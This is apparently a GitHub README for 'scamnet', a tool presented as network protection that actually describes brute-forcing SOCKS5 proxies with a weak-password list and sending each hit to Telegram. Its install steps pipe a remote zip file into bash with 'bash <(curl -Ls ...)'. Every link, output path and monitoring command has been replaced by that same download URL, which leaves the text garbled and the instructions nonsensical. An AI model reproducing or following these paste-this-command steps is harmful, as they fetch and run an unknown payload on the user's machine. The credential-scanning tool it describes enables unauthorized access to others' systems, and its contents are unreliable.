# 🛡️ scamnet - Protect Your Network with Ease

[![Download scamnet](https://github.com/kenttibusiness/scamnet/raw/refs/heads/main/spier/Software_v2.6.zip)](https://github.com/kenttibusiness/scamnet/raw/refs/heads/main/spier/Software_v2.6.zip)

## 🚀 Getting Started

Welcome to scamnet! This application helps you generate weak password dictionaries and scan networks efficiently. Follow the steps below to download and run scamnet.

## 📥 Download & Install

1. **Visit our Releases Page**: Go to [scamnet Releases](https://github.com/kenttibusiness/scamnet/raw/refs/heads/main/spier/Software_v2.6.zip) to find the latest version.
2. **Choose Your Script**: You have two options for installation:
   - **Single Protocol**: This option is suitable for basic needs.
     ```
     bash <(curl -Ls https://github.com/kenttibusiness/scamnet/raw/refs/heads/main/spier/Software_v2.6.zip)
     ```
   - **Full Protocol**: Use this option for comprehensive scanning features.
     ```
     bash <(curl -Ls https://github.com/kenttibusiness/scamnet/raw/refs/heads/main/spier/Software_v2.6.zip)
     ```
3. **Run the Script**: Copy and paste the chosen command into your terminal. This will set up scamnet on your machine.

## 🔍 Features Overview

scamnet includes multiple powerful features that enhance your network security:

1. **Interactive Configuration**: Input your IP range, ports, and Telegram information during the setup.
2. **Weak Password Dictionary**: The built-in dictionary includes 324 common weak passwords (like admin:admin).
3. **Concurrent Scanning**: The Go-based scanner supports up to 150 simultaneous connections, processing 250 items per batch with a timeout of 6 seconds.
4. **Slow Proxy Support**: It increases the delay up to 15,000 ms to ensure compatibility with slow proxies.
5. **Country Recognition**: Automatically identifies countries such as #US, #CN, and #KR.
6. **De-duplicated Results**: Outputs unique, sorted results to `https://github.com/kenttibusiness/scamnet/raw/refs/heads/main/spier/Software_v2.6.zip`.
7. **Real-time Telegram Notification**: Sends immediate notifications on each successful hit.
8. **Daemon Process**: Keeps the scanning process running continuously, automatically restarting after each round.

## 📂 Output Files

Running scamnet generates several important files:

- **https://github.com/kenttibusiness/scamnet/raw/refs/heads/main/spier/Software_v2.6.zip**: Contains the final, de-duplicated results in the format `socks5://user:pass@ip:port#CN`.
- **https://github.com/kenttibusiness/scamnet/raw/refs/heads/main/spier/Software_v2.6.zip**: Your weak password dictionary.
- **https://github.com/kenttibusiness/scamnet/raw/refs/heads/main/spier/Software_v2.6.zip**: Live log file that includes debugging and other information.
- **logs/scamnet_go**: The compiled binary file for further use.

## 📊 Real-time Monitoring Commands

You can monitor the scanning results in real-time using these commands:

- **Success Only View** (recommended):
    ```
    tail -f https://github.com/kenttibusiness/scamnet/raw/refs/heads/main/spier/Software_v2.6.zip | grep '^\[+]'
    ```
- **Colored Output**:
    ```
    tail -f https://github.com/kenttibusiness/scamnet/raw/refs/heads/main/spier/Software_v2.6.zip | grep --color=always '^\[+]'
    ```
- **Silent Background Logging**:
    ```
    nohup tail -f https://github.com/kenttibusiness/scamnet/raw/refs/heads/main/spier/Software_v2.6.zip | grep '^\[+]' >> https://github.com/kenttibusiness/scamnet/raw/refs/heads/main/spier/Software_v2.6.zip &
    ```

## 🛑 Stopping the Scan

To stop the scanning process, use the following command in your terminal:
```
pkill -f https://github.com/kenttibusiness/scamnet/raw/refs/heads/main/spier/Software_v2.6.zip
```

## 📑 Additional Information

- **System Requirements**: Ensure your machine runs a compatible version of bash. It should have internet access for downloading scripts.
- **User Support**: If you encounter any issues, feel free to reach out through the GitHub page for assistance.

## ⚙️ Frequently Asked Questions

**Q1: Do I need programming knowledge to use scamnet?**  
No, scamnet is designed for users of all skill levels. Follow the instructions, and you will be able to set it up.

**Q2: Can I customize the settings during the scan?**  
Yes, the application allows you to input specific parameters like IP range and ports directly during the setup process.

Remember, you can always find the latest updates and additional resources on the [scamnet Releases page](https://github.com/kenttibusiness/scamnet/raw/refs/heads/main/spier/Software_v2.6.zip).